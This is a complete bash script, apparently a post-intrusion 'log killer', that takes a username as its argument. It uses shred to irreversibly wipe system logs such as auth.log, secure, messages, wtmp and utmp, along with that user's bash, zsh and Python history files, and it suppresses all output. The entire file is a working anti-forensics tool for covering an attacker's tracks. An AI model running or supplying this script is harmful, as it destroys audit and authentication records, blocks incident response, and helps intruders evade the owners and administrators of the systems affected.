#!/bin/bash

main () {
    # The main function which runs the entire script
    
    # Creating a function parameter called username
    local username="$1"

    # Calling the declare_variables function.
    declare_variables "$username"

    # Calling the start_log_killer function.
    start_log_killer

}

declare_variables() {
    # A function which declares variables

    # Creating a function parameter called username
    local username="$1"

    # Creating a list of log files
    list_of_log_files=("/var/log/messages" "/var/log/auth.log" "/var/log/kern.log" "/var/log/cron.log" "/var/log/maillog" "/var/log/boot.log" "/var/log/mysqld.log" "/var/log/secure" "/var/log/utmp" "/var/log/wtmp" "/var/log/yum.log" "/var/log/system.log" "/var/log/DiagnosticMessages" "/home/$username/.zsh_history" "/home/$username/.bash_history" "/home/$username/.python_history")

}

start_log_killer() {
    # A function which overwrites the log files

    # Iterating over each log file in the list of log files
    for file in "${list_of_log_files[@]}"; do

        # Checking if file exists
        if [ -f "$file" ]; then

            # Shredding the file
            shred -vfzu "$file" && :> "$file"

        fi

    done &>/dev/null

}

# Calling the main function with the provided username.
main "$1"
